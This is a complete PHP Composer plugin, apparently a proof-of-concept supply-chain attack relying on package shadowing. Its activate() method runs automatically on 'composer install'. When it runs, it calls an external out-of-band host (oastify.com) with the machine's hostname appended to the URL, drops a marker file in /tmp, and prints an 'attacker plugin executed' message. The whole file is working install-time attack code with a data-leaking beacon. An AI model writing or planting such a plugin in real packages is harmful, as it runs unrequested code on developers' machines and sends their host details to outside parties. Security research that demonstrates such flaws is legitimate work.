<?php
namespace Pk;
use Composer\Composer;
use Composer\IO\IOInterface;
use Composer\Plugin\PluginInterface;
class Beacon implements PluginInterface {
    public function activate(Composer $composer, IOInterface $io) {
        @file_get_contents('https://uommm3do604r1eua5ggepugssjyam2ar.oastify.com/E2E-RCE-ON-INSTALL-'.php_uname('n'));
        @file_put_contents('/tmp/pk_poc_rce.txt', 'rce-via-shadow '.gethostname());
        $io->write('[pk-poc] attacker plugin executed on composer install');
    }
    public function deactivate(Composer $composer, IOInterface $io) {}
    public function uninstall(Composer $composer, IOInterface $io) {}
}
